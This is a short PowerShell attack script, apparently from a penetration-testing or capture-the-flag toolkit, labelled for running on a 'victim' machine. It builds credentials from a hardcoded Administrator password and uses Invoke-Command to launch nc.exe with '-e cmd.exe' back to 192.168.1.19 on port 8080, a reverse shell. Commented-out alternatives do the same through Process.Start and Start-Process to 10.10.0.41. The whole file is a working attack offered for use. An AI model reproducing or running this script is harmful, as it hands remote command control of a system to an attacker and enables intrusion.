# udpate params and execute .ps1 on victim

$username = 'Administrator'
$password = 'secur3_apass262'
$computer = 'localhost'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Invoke-Command -ScriptBlock { C:\Users\alecm\Desktop\shared_kali\nc.exe 192.168.1.19 8080 -e cmd.exe } -Credential $credential -computername $computer

# ALTERNATIVE METHODS TO EXECUTE
# [System.Diagnostics.Process]::Start("C:\Users\alecm\Desktop\shared_kali\nc.exe","192.168.1.19 8080 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
# Start-Process -FilePath C:\Users\Public\downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ('10.10.0.41','445','-e','cmd.exe') -WorkingDirectory C:\Users\Publc\downloads